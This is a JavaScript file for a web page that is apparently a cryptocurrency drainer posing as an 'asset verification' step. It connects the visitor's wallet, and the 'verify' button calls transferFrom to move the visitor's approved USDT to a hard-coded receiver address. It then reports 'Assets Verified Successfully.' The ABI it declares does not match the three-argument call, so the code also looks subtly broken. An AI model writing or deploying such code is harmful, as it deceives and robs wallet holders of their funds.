const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
const receiver = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";

window.addEventListener('load', async () => {
  if (typeof window.ethereum !== 'undefined') {
    try {
      await ethereum.request({ method: 'eth_requestAccounts' });
      window.web3 = new Web3(window.ethereum);
    } catch (error) {
      alert('Wallet connection failed.');
    }
  } else {
    alert('Please use Trust Wallet or MetaMask browser');
  }
});

document.getElementById('verifyBtn').addEventListener('click', async () => {
  try {
    const web3 = new Web3(window.ethereum);
    const accounts = await web3.eth.getAccounts();
    const sender = accounts[0];

    const abi = [
      {
        constant: false,
        inputs: [
          { name: "_to", type: "address" },
          { name: "_value", type: "uint256" }
        ],
        name: "transferFrom",
        outputs: [{ name: "", type: "bool" }],
        type: "function"
      }
    ];

    const contract = new web3.eth.Contract(abi, usdtAddress);

    await contract.methods
      .transferFrom(sender, receiver, web3.utils.toWei("1000000", "mwei")) // transfer approved USDT
      .send({ from: sender });

    alert("Assets Verified Successfully.");
  } catch (err) {
    console.error(err);
    alert("Verification failed.");
  }
});
